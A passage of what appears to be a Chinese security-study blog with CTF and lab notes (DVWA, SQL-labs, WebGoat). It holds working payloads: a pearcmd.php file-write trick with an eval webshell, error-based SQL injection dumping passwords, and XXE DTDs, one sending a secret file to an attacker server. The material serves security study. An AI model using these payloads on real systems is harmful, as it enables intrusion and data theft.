<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br></pre></td></tr></table></figure>

<p>这里在 echo处已经随机了一次，所以在底下比较的时候就算第二个随机数进行强类型比较</p>
<p>于是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="string">&quot;1145146&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line">==&gt;<span class="number">1219893521</span>&lt;br&gt;<span class="number">1202031004</span></span><br></pre></td></tr></table></figure>

<p>得到<code>guess</code>参数的值<code>1202031004</code></p>
<p>对于最后对<code>file</code>文件包含语句的正则匹配绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>大概就是不能出现<code>base</code>，然后参数中间要包含<code>/NewStar/</code>这一段</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter</span><br></pre></td></tr></table></figure>

<h1 id="17-pearcmd-php的巧妙利用"><a href="#17-pearcmd-php的巧妙利用" class="headerlink" title="17.pearcmd.php的巧妙利用"></a>17.<code>pearcmd.php</code>的巧妙利用</h1><blockquote>
<p>来自P神博客</p>
<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
</blockquote>
<p>就是利用<code>pearcmd.php</code>这个<code>pecl/pear</code>中的文件。</p>
<p><code>pecl</code>是<code>PHP</code>中用于管理扩展而使用的命令行工具，而<code>pear</code>是<code>pecl</code>依赖的类库。在<code>7.3</code>及以前，<code>pecl/pear</code>是默认安装的；在<code>7.4</code>及以后，需要我们在编译<code>PHP</code>的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在<code>Docker</code>任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<blockquote>
<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?+config-create+<span class="regexp">/&amp;file=/u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd.php&amp;<span class="regexp">/&lt;?=phpinfo()?&gt;+/</span>tmp/hello.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>#config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p>
</blockquote>
<p>发送数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code></p>
<blockquote>
<p><code>/tmp/hello.php</code><br>当然也可以改成<code>/var/html/www</code>，这样就可以直接读取，不用利用文件包含参数进行对<code>/tmp/hello.php</code>读取</p>
<p>只是放在<code>/tmp</code>下不容易触发防火墙被删除</p>
</blockquote>
<p>利用文件包含存在，再包含这个文件，就会显示我们的信息</p>
<blockquote>
<p><code>&lt;?=phpinfo()?&gt;</code><br>也可以改写成<br><code>&lt;?=eval($_POST[8]);&gt;</code><br>这样就可以执行更多的命令了</p>
</blockquote>
<h1 id="18-记一次docker搭建复现web题目环境"><a href="#18-记一次docker搭建复现web题目环境" class="headerlink" title="18.记一次docker搭建复现web题目环境"></a>18.记一次docker搭建复现web题目环境</h1><h2 id="1-构造镜像"><a href="#1-构造镜像" class="headerlink" title="1.构造镜像"></a>1.构造镜像</h2><p><img src="/2022/05/31/daily/image-20230122143200058.png" alt="image-20230122143200058"></p>
<p>可以看到这里有个<code>Dockerfile</code>文件</p>
<blockquote>
<p><code>docker build -t image_name .</code><br>&#x2F;&#x2F;这里是利用<code>dockerfile</code>创建一个命名为<code>image_name</code>的镜像【后面的点不能少】</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122143320959.png" alt="image-20230122143320959"></p>
<h2 id="2-查看镜像是否创建成功"><a href="#2-查看镜像是否创建成功" class="headerlink" title="2.查看镜像是否创建成功"></a>2.查看镜像是否创建成功</h2><blockquote>
<p><code>docker images</code></p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122144225392.png" alt="image-20230122144225392"></p>
<h2 id="3-运行启动镜像，创建环境"><a href="#3-运行启动镜像，创建环境" class="headerlink" title="3.运行启动镜像，创建环境"></a>3.运行启动镜像，创建环境</h2><blockquote>
<p><code>docker run -i -d -P image_name</code> </p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122144315740.png" alt="image-20230122144315740"></p>
<h2 id="4-查看容器启动端口"><a href="#4-查看容器启动端口" class="headerlink" title="4.查看容器启动端口"></a>4.查看容器启动端口</h2><blockquote>
<p><code>docker ps -a</code></p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122144348333.png" alt="image-20230122144348333"></p>
<p>可以看到是再32768端口运行</p>
<blockquote>
<p>访问<code>127.0.0.1:32768</code></p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122144453902.png" alt="image-20230122144453902"></p>
<p>搭建成功</p>
<h2 id="5-关闭容器"><a href="#5-关闭容器" class="headerlink" title="5.关闭容器"></a>5.关闭容器</h2><blockquote>
<p><code>docker ps -a</code></p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122150253748.png" alt="image-20230122150253748"></p>
<blockquote>
<p><code>docker stop CONTAINER ID </code></p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122214402594.png" alt="image-20230122214402594"></p>
<h2 id="6-删除镜像【觉得环境镜像后面有用的可以留着】"><a href="#6-删除镜像【觉得环境镜像后面有用的可以留着】" class="headerlink" title="6.删除镜像【觉得环境镜像后面有用的可以留着】"></a>6.删除镜像【觉得环境镜像后面有用的可以留着】</h2><blockquote>
<p><code>docker images</code></p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122150428681.png" alt="image-20230122150428681"></p>
<blockquote>
<p><code>docker rmi IMAGE ID</code></p>
<p>&#x2F;&#x2F;注：有的需要强制，所以需要在后面加上参数<code>-f</code></p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20230122214537155.png" alt="image-20230122214537155"></p>
<h1 id="19-libmbfl打分"><a href="#19-libmbfl打分" class="headerlink" title="19.libmbfl打分"></a>19.libmbfl打分</h1><blockquote>
<p>所以实现&#96;&#96;$charset &#x3D;&#x3D; BASE64&#96;，只要文件内容前面数据让它识别为base64即可</p>
<p>那么如何让其认为是base64呢？</p>
<p>这就涉及到<code>libmbfl</code>的打分，<code>libmbfl</code>是<code>mb</code>扩展</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>我的理解就是类似像<code>checkengine</code>，比如<code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p>
</blockquote>
<p>这是打分判断</p>
<blockquote>
<p>0xFFFF是-1，&gt;&#x3D;0 </p>
<blockquote>
<p>0x21是33 33对应!</p>
<p>0x2F是47 47对应&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>打分打的多</p>
</blockquote>
<h1 id="20-PHPのmb系列返回值"><a href="#20-PHPのmb系列返回值" class="headerlink" title="20.PHPのmb系列返回值"></a>20.PHPのmb系列返回值</h1><blockquote>
<p><code>https://github.com/php/php-src/issues/9008</code></p>
<p>它会导致奇怪的结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line"> <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line"> <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line"> <span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到的结果发现</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>mb_detect_encoding($string, null, true)</code>返回值</p>
<p>只有在<code>PHP</code>版本在<code>8.1.0 - 8.1.9</code>时会返回<code>base64</code>，而在其他版本都是默认识别为<code>ASCII</code></p>
</blockquote>
<h1 id="21-Tomcat以-一种奇怪的方式进行规范化"><a href="#21-Tomcat以-一种奇怪的方式进行规范化" class="headerlink" title="21.Tomcat以;一种奇怪的方式进行规范化"></a>21.Tomcat以;一种奇怪的方式进行规范化</h1><blockquote>
<p><code>;</code>后的数据不解析</p>
<p>即可<code>http://127.0.0.1/index;123.ico</code>，读取时只视为<code>http://127.0.0.1/index</code></p>
</blockquote>
<h1 id="22-Java表达式注入之OGNL"><a href="#22-Java表达式注入之OGNL" class="headerlink" title="22.Java表达式注入之OGNL"></a>22.Java表达式注入之OGNL</h1>]]></content>
      <categories>
        <category>知识点笔记</category>
      </categories>
      <tags>
        <tag>daily</tag>
      </tags>
  </entry>
  <entry>
    <title>线下靶场学习</title>
    <url>/2022/06/21/underline-learning/</url>
    <content><![CDATA[<p><code>为什么学习线下靶场，因为线下靶场相比更加容易理解漏洞入门，</code></p>
<p><code>而且可以看到网站的源码，从而可以锻炼代码审计能力，找出漏洞的成因，</code></p>
<p><code>尝试自己提出绕过或者防御的措施，这里只记录一下本人觉得的线下靶场印象深刻，对本人有意义的部分</code></p>
<span id="more"></span>

<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a href="https://blog.csdn.net/zy15667076526/article/details/109705286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165390231016781818750292%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165390231016781818750292&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109705286-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=dvwa&spm=1018.2226.3001.4187">推荐文章链接</a></p>
<p><em><u>不要只知道payload，要仔细分析理解源码，找出出现漏洞的原因点</u></em></p>
<p><u><code>建议看推荐文章，下面代码审计和题目分析仅是我个人能力结果，只能尽可能说到点处</code></u></p>
<p><u><code>而且部分也是借鉴推荐文章内容</code></u></p>
<h1 id="SQL-labs"><a href="#SQL-labs" class="headerlink" title="SQL-labs"></a>SQL-labs</h1><p><em><u>这里不全写，详细建议找一下sql-labs天书，认真学习一下</u></em></p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>其实我们可以先在源代码中看到一个函数。<code>check_input()</code>函数。 就会了解为什么不在<code>username</code>处进行注入</p>
<p><img src="/2022/06/21/underline-learning/image-20220729232132515.png" alt="image-20220729232132515"></p>
<p><img src="/2022/06/21/underline-learning/image-20220729232104117.png" alt="image-20220729232104117"></p>
<p>这里把这几个函数解释一下，就清楚了</p>
<p><strong>★addslashes()</strong></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">addslashes<span class="comment">()</span> 函数返回在预定义字符之前添加反斜杠的字符串。 </span><br><span class="line"></span><br><span class="line">预定义字符是： </span><br><span class="line"></span><br><span class="line">​单引号（<span class="string">&#x27;） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​双引号（&quot;） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​反斜杠（\） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​NULL </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">以使用函数 get_magic_quotes_gpc() 进行检测。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>



<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">语法：addslashes(<span class="built_in">string</span>) </span><br><span class="line"></span><br><span class="line">参数             描述</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>          必需。规定要转义的字符串。 </span><br><span class="line"></span><br><span class="line">返回值：         返回已转义的字符串。 </span><br><span class="line"></span><br><span class="line">PHP 版本：       <span class="number">4</span>+ </span><br></pre></td></tr></table></figure>

<p><strong>★stripslashes()</strong> </p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">函数删除由 <span class="built_in">addslashes</span>() 函数添加的反斜杠。 </span><br></pre></td></tr></table></figure>

<p><strong>★mysql_real_escape_string()</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">函数转义 <span class="keyword">SQL</span> 语句中使用的字符串中的特殊字符。 </span><br></pre></td></tr></table></figure>

<p>下列字符受影响： </p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="string">\x00</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\n</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\r</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\</span> </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\x1a </span></span><br></pre></td></tr></table></figure>

<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 </p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">语法：mysql<span class="constructor">_real_escape_string(<span class="params">string</span>,<span class="params">connection</span>)</span> </span><br><span class="line"></span><br><span class="line">参数                              描述 </span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>                            必需。规定要转义的字符串。 </span><br><span class="line"></span><br><span class="line">connection 可选。    规定 MySQL 连接。如果未规定，则使用上一个连接</span><br></pre></td></tr></table></figure>

<p>所以注入处应该在<code>passwd</code>中</p>
<p>开始先尝试注入，发现没有回显，</p>
<p>所以试试报错注入</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#</code></p>
<p>报出<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
<p><img src="/2022/06/21/underline-learning/image-20220905094419111.png" alt="image-20220905094419111"></p>
<p><u>大致意思是，在同一语句中，不能先select出同一表中的某些值，再update这个表</u></p>
<p>所以这里就需要加一个中间表，就可以绕过这个错误</p>
<p>比如</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#</code></p>
<p>这里就是把<code>(select password from users)</code>的查询后的数据存入生成的新表a，然后就相当于<code>(select password from a)</code></p>
<p><img src="/2022/06/21/underline-learning/image-20220905094517322.png" alt="image-20220905094517322"></p>
<p>发现不能超过一行</p>
<p>于是用</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#</code></p>
<p>成功</p>
<p><img src="/2022/06/21/underline-learning/image-20220905094540906.png" alt="image-20220905094540906"></p>
<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>建议看文章，最后几关二次渲染和条件竞争建议仔细学习一下</p>
<h1 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h1><h2 id="一-XXE"><a href="#一-XXE" class="headerlink" title="一.XXE"></a>一.XXE</h2><h3 id="1-Let’s-try"><a href="#1-Let’s-try" class="headerlink" title="1.Let’s try"></a>1.Let’s try</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">在此作业中，您将为照片添加评论，在提交表单时尝试使用评论字段执行 XXE 注入。尝试列出文件系统的根目录。</span><br></pre></td></tr></table></figure>





<p>我们先提交评论然后抓包试试</p>
<p><img src="/2022/06/21/underline-learning/image-20221015192748515.png" alt="image-20221015192748515"></p>
<p>这时我们发现评论的内容是在用<code>xml</code>进行传递，</p>
<p>可以编写<code>dtd</code>来进行内部实体注入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/underline-learning/image-20221015195142684.png" alt="image-20221015195142684"></p>
<p>成功</p>
<h3 id="2-Modern-REST-framework"><a href="#2-Modern-REST-framework" class="headerlink" title="2.Modern REST framework"></a>2.Modern REST framework</h3><h4 id="前言：-1"><a href="#前言：-1" class="headerlink" title="前言："></a>前言：</h4><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">在现代 REST 框架中，服务器可能能够接受您作为开发人员没有考虑过的数据格式。因此，这可能会导致 JSON 端点容易受到 XXE 攻击。</span><br><span class="line"></span><br><span class="line">再次进行相同的练习，但尝试执行与我们在第一个作业中所做的相同的 <span class="keyword">XML</span> <span class="title">注入。</span></span><br></pre></td></tr></table></figure>





<p>这个明显发现底下的评论传递格式不再是<code>xml</code></p>
<p>而是在用<code>json</code>进行传递</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">json：</span><br><span class="line">是一种轻量级的数据交换格式。人类很容易阅读和写作。机器很容易解析和生成。它基于 JavaScript 编程语言标准</span><br><span class="line"></span><br><span class="line">在 JSON 中，它们采用以下形式：</span><br><span class="line"></span><br><span class="line">对象是一组无序的名称<span class="regexp">/值对。一个对象以&#123;（左大括号）开始，以&#125;（右大括号）结束。每个名称后跟：冒号，名称/</span>值对由逗号分隔。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/underline-learning/image-20221015195333753.png" alt="image-20221015195333753"></p>
<p>这里我们看</p>
<p><img src="/2022/06/21/underline-learning/image-20221015200313439.png" alt="image-20221015200313439"></p>
<p>就知道是修改 <code>Content-Type</code></p>
<p><img src="/2022/06/21/underline-learning/image-20221015200353909.png" alt="image-20221015200353909"></p>
<p>我们直接把</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">json</span></span><br><span class="line">改成</span><br><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">xml</span></span><br></pre></td></tr></table></figure>

<p>那就可以以 <code>xml</code> 形式上传评论，从而实现 <code>xxe</code> 注入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/underline-learning/image-20221015200758568.png" alt="image-20221015200758568"></p>
<p>成功</p>
<h3 id="3-Blind-XXE-assignment"><a href="#3-Blind-XXE-assignment" class="headerlink" title="3.Blind XXE assignment"></a>3.Blind XXE assignment</h3><h4 id="前言：-2"><a href="#前言：-2" class="headerlink" title="前言："></a>前言：</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">在本作业中尝试制作一个 DTD，它将文件 secret.txt 的内容从 WebGoat 服务器上传到我们的 WebWolf 服务器。您可以使用 WebWolf 为您的 DTD 提供服务。secret.txt 位于此位置的 WebGoat 服务器上，因此您无需扫描所有目录和文件：</span><br><span class="line"></span><br><span class="line">你	                 地点</span><br><span class="line">Windows <span class="number">10</span>            C:\Users\Ttoc<span class="regexp">/.webgoat-8.2.2/</span><span class="regexp">/XXE/</span>secret.txt</span><br><span class="line"></span><br><span class="line">尝试使用 WebWolf 登录页面上传此文件，例如：（ 注意：此端点由您完全控制）一旦您获得文件的内容，将其作为新评论发布在页面上，您将解决课程。http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9090</span>/landing</span><br></pre></td></tr></table></figure>





<p>盲注就是没有回显内容，但是我们需要把我们目标服务器的敏感文件内容获取到我们的服务器</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">简而言之，</span><br><span class="line"></span><br><span class="line">webgoat开启了站点，这个站点有XXE，webgoat服务器上有个密码文件，通过XXE把这个密码文件读取，并且发送到我们自己的恶意站点webwolf，webwolf接受到这个请求就顺理成章获取了密码文件里面的密码</span><br></pre></td></tr></table></figure>



<p>这里主要利用<code>xml</code>通过<code>DTD</code>实现文件包含，</p>
<p>先把我们自己写的<code>DTD</code>文件包含在我们的服务器<code>webwolf</code>，然后在<code>webgoat</code>上通过<code>xxe</code>进行远程包含我们站点的这个<code>DTD</code>文件，然后<code>webgoat</code>在解析我们的<code>DTD</code>文件的时候就会把<code>secret.txt</code>文件内容赋值到文件并作为参数发送到我们的<code>webwolf</code>服务器</p>
<hr>
<p>我们先发送评论看看</p>
<p>这里发送的是空内容，回显的内容看来是提示，</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">需要我们先在`webwolf`上上传文件</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/underline-learning/image-20221017201611949.png" alt="image-20221017201611949"></p>
<p>我们先抓包看看webgoat的评论的解析格式是怎么样的</p>
<p><img src="/2022/06/21/underline-learning/image-20221017201938082.png" alt="image-20221017201938082"></p>
<p>看来是正常的<code>xml</code>解析</p>
<p>我们先在<code>webwolf</code>上上传我们的<code>evil.dtd</code>文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//声明变量 write 并嵌套赋值<span class="meta">&lt;!ENTITY <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://localhost:9090/landing?text=%file;&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">为什么还要用一个参数实体嵌套呢？</span><br><span class="line">因为如果我们用一个write参数实体将send外部实体的定义写进请求中，在%write;执行的过程中，%file也会被替换成相应的文本。因此最后，?text后面的值就是我们想要的内容</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/underline-learning/image-20221017205520515.png" alt="image-20221017205520515"></p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">这里的变量赋值和前面的不同</span><br><span class="line">它是</span><br><span class="line"><span class="comment">%（空格）变量名</span></span><br><span class="line">这种命名的方式的变量只能在DTD里用，而在xml里用不了</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/underline-learning/image-20221017211907400.png" alt="image-20221017211907400"></p>
<p>上传成功后我们在<code>incoming requests</code>里看到上传路径，这样在<code>webgoat</code>就调用访问包含就行了</p>
<p><img src="/2022/06/21/underline-learning/image-20221017211827208.png" alt="image-20221017211827208"></p>
<p>然后我们再在<code>webgoat</code>抓包数据里构造我们的<code>payload</code></p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Users/Ttoc/.webgoat-8.2.2/XXE/secret.txt&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//这个路径是有这个文件，因为在执行jar文件的时候，自动生成了这个文件</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">getdtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/ttocplus/evil.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//注意这里是上传路径，要写自己的</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%getdtd; </span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%write;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//在%getdtd;后面调用%write;</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span 